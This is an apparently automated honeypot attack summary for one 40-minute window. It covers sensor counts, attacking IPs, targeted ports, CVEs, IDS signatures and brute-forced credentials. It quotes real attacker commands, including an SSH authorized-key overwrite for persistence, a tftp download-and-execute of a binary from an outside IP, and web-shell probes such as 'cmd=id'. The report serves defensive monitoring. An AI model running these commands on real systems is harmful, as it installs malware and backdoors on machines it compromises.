Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-08T21:01:26Z
**Timeframe:** 2025-10-08T20:20:01Z to 2025-10-08T21:00:01Z
**Log Files:**
- agg_log_20251008T202001Z.json
- agg_log_20251008T204001Z.json
- agg_log_20251008T210001Z.json

### Executive Summary
This report summarizes 13,843 events collected from the honeypot network over the last hour. The majority of attacks were captured by the Cowrie and Honeytrap honeypots. A significant number of SSH brute-force attempts and reconnaissance scans were observed. Attackers attempted to install SSH keys and run various system commands to gather information. Multiple CVEs were targeted, and a variety of malware and backdoors were attempted to be uploaded.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 4892
- Honeytrap: 2375
- Suricata: 1977
- Ciscoasa: 1995
- Mailoney: 909
- H0neytr4p: 330
- Dionaea: 113
- Sentrypeer: 127
- Tanner: 93
- Redishoneypot: 15
- Heralding: 9
- Honeyaml: 5
- Dicompot: 3

**Top Attacking IPs:**
- 176.65.141.117: 820
- 193.32.162.157: 344
- 205.185.117.149: 258
- 85.174.180.56: 265
- 5.167.79.4: 252
- 101.36.107.103: 243
- 171.244.40.23: 223
- 185.220.101.191: 154
- 80.253.31.232: 219
- 95.85.114.218: 154
- 94.16.115.121: 153
- 144.91.114.89: 164
- 103.31.38.141: 203
- 45.119.213.112: 179
- 170.238.160.191: 178
- 141.138.146.167: 111
- 104.168.56.59: 118
- 188.164.195.81: 114
- 79.106.73.114: 109
- 89.126.208.72: 109

**Top Targeted Ports/Protocols:**
- 25: 876
- 22: 620
- 443: 332
- TCP/8080: 253
- 5903: 206
- TCP/8443: 197
- TCP/443: 145
- 8333: 85
- 5060: 127
- 80: 96
- 23: 51
- TCP/22: 38
- 5901: 49
- 4443: 22
- 5907: 35
- 5909: 34
- 5908: 32

**Most Common CVEs:**
- CVE-2019-11500
- CVE-2021-3449
- CVE-2021-35394
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- uname -a
- whoami
- top
- crontab -l
- w
- uname -m
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- tftp; wget; /bin/busybox ZLTBL
- rm .s; tftp -l.i -r.i -g 50.80.69.193:65027; chmod 777 .i; ./.i; exit

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- GPL INFO SOCKS Proxy attempt
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET INFO Incoming Basic Auth Base64 HTTP Password detected unencrypted
- ET TOR Known Tor Relay/Router (Not Exit) Node Traffic
- ET INFO Reserved Internal IP Traffic
- ET HUNTING RDP Authentication Bypass Attempt
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- operator/operator123456789
- root/root888
- guest/dietpi
- alarm/alarm
- supervisor/password321
- root/adminHW
- remoto/remoto!
- userbot/3245gs5662d34
- unknown/default

**Files Uploaded/Downloaded:**
- salem.php?p=midoMIDOmidoMIDObadrABOBADRMIDO&c=id...
- PBX.php?cmd=id...
- ppsra.php?cmd=id...
- Ultimatex.php?ba5ffcc0b3bba5d=id...
- config.all.php?x
- config.all.php?
- mips.nn;
- ari.conf
- ajax.php?cmd=cat+ajax.php&
- index.php?pal=cat+index.php&
- xx.php?x1q23ed
- fx29.php?
- test.php?cc
- login.php?z

**HTTP User-Agents:**
- (No data)

**SSH Clients and Servers:**
- (No data)

**Top Attacker AS Organizations:**
- (No data)

### Key Observations and Anomalies
- A high volume of repeated commands related to SSH key manipulation suggests automated attacks aimed at maintaining persistent access.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...` was seen across multiple attacks, indicating a coordinated campaign.
- The file `config.all.php` was repeatedly accessed, which could be an attempt to exploit a specific vulnerability or to check for misconfigurations.
- The presence of commands like `tftp` and `wget` followed by execution of downloaded files is a clear indicator of malware delivery attempts.
- A wide range of usernames and passwords were attempted, from default credentials to more complex combinations, showing a mix of targeted and brute-force approaches.
